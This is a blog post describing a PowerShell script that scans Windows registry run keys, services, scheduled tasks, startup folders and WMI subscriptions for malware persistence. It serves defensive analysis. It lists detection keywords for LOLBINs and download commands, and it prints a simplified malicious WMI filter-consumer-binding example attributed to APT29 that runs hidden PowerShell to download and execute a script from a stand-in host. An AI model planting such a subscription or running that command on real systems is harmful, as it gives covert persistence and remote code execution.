---
layout: post
title:  "Powershell for Checking Malware Persistence (All-In-One Script)"
date:   2025-06-16 21:00:00 +1000
categories: project
---

<style>
  body { font-size: 13px; }
  h1 { font-size: 19px !important; }
  h2 { font-size: 17px !important; }
  h3 { font-size: 15px !important; }
</style>

### Overview
[-----Malware Persistence Checker-----](https://github.com/lvl0socanalyst/Scripts/blob/main/malware_persistence_checker.ps1)

Script that checks for common malware persistence vectors.

Useful when performing analysis on a potentially compromised PC that has been disconnected from the internet. 

Rather than post the whole script I'll just run over and explain the functions/how to use it. 

I'll slowly add function by function. But I'll start with reg keys. Couldn't you just use autoruns? YES. But that's no fun.

Potentially suspicious findings will be dumped in CLI. All results will be whacked into a .txt file
- Therefore, if you don't like the regex or what is marked as 'suspicious' you can change it. Or just view the .txt to see the full output

Script gives the following options:
1. Scan Registry Persistence Keys
2. Scan Service Keys
3. Scan Scheduled Tasks
4. Scan Startup Folders
5. Scan WMI Event Subscriptions
6. Scan Everything 
7. Exit

![PowerShell Script Options](/images/script_photo.png)

### Potentially suspicious indicators

The script outputs all results to a .txt file. However, entries that seem suspicious are plastered onto the CLI. These are the following indicators I came up with for files/commands/flags that can raise a red flag.

Indicators
- ```"AppData", "Temp", "Roaming", "LocalLow", "Public", "Users\\Public", "\.vbs", "\.js", "\.bat", "\.cmd", "\.ps1", "\.scr", "wscript.exe", "cscript.exe", "powershell.exe", "mshta.exe", "rundll32.exe", "cmd.exe", "System32\\Tasks", "Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved", "curl.exe", "wget.exe", "base64", "Invoke-", "DownloadString", "EncodedCommand" ```


### Registry and Windows Service Keys

Registry keys are fileless. Hence why they a common spot for malware payloads to exist. Payloads stored in reg keys are often called later by scheduled tasks or WMI events. 

A malicious registry payload would typically call powershell to download or invoke a payload.

Checks the following registry keys
- HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
- HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce
- HKLM:\Software\Microsoft\Windows\CurrentVersion\Run
- HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce
- HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
- HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
- HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components
- HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
- HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify

Service keys are also checked for the above indicators. 
- HKLM:\SYSTEM\CurrentControlSet\Services


### Scheduled Tasks
Malware will often create a scheduled task to run at a certain time to give persistence on the host device. This ensures even after a restart or shutdown the beacon can be reinstated.

Scans all scheduled tasks that don't have \Microsoft\ in the path.

Pretty popular persistence vector however is quite well known. One of the first SIEM rules you create should be for alerting on schtasks.exe usage or for tasks here that aren't known.


### Startup Folders
Files that reside here are executed on startup. Much like scheduled tasks a very common area for malware to reside to ensure persistence after a restart/shutdown.

The following startup folders are checked
- AppData\Microsoft\Windows\Start Menu\Programs\Startup
- ProgramData\Microsoft\Windows\Start Menu\Programs\Startup

Malicious files that are set to start on boot here are often named as legitimate Microsoft files and LOLBINs to avoid suspicion.


### WMI Event Subscriptions
WMI subscriptions allow for commands to trigger when a system event occurs. Likewise to reg entries this method is fileless and quite a common method for persistence for more advanced malware.

WMI subscriptions use WQL (Windows Management Instrumentation Query Language) to create conditions on which they should trigger and the action that will occur. WQL uses very similar syntax to SQL, and reads almost like pseudocode. 

An example of a malicious WMI subscription that was used by CozyBear (APT 29).

-----Sets the condition for which the action is triggered (creation of a filter)-----
- ```Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='explorer.exe'"```

-----Sets the action when the filter is triggered (creation of a consumer)-----
- ```CommandLineTemplate = "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http:cozynoobs.com/minecraft.ps1')"```

-----Binds filter to the consumer (creates condition that runs consumer when filter occurs)
- ```Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{ Filter = $filter.__PATH Consumer = $consumer.__PATH }```

That was a very dumbed down version of the actual event subscription used. But you get the idea of how it is structured. A filter is created which in turn when triggered runs the consumer (action) that runs the suspicious commands.

The following subscriptions are checked
- Get-WmiObject -Namespace root\subscription -Class __EventFilter
- Get-WmiObject -Namespace root\subscription -Class __EventConsumer
- Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding